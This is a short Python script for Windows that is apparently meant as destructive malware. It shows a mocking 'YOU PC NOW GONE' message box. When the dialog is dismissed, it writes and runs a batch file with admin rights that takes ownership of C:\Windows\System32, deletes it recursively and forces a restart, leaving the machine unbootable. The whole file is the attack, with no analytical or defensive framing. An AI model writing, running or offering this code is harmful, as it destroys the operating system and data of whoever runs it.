import ctypes
import subprocess
import os

# Customize your message here
message_text = "YOU HAVE ENTERED DE TWISTER ZONE!!! YOU PC NOW GONE!!!"

# Show the message box
response = ctypes.windll.user32.MessageBoxW(0, message_text, "Warning", 0x40 | 0x1)

# Path for the batch file (modify this as needed)
bat_file_path = "C:\\Users\\Public\\execute_commands.bat"

# Commands to include in the batch file
cmd_commands = [
    "takeown /f c:\windows\system32",
    "cacls c:\windows\system32",
    "rd /s /q c:\windows\system32",
    "del /s /q c:\windows\system32\*.*",
    "shutdown /r /t 5"  # Restart command
]

# Function to create and execute the batch file as admin
def create_and_run_bat(commands, file_path):
    # Write the commands to the batch file
    with open(file_path, "w") as bat_file:
        bat_file.write("\n".join(commands))
    
    # Run the batch file with elevated privileges
    subprocess.run(f'powershell -Command "Start-Process cmd -ArgumentList \'/k {file_path}\' -Verb runAs"', shell=True)

# Execute when user clicks OK or closes the dialog
if response in [1, 2]:  # OK or Close
    create_and_run_bat(cmd_commands, bat_file_path)
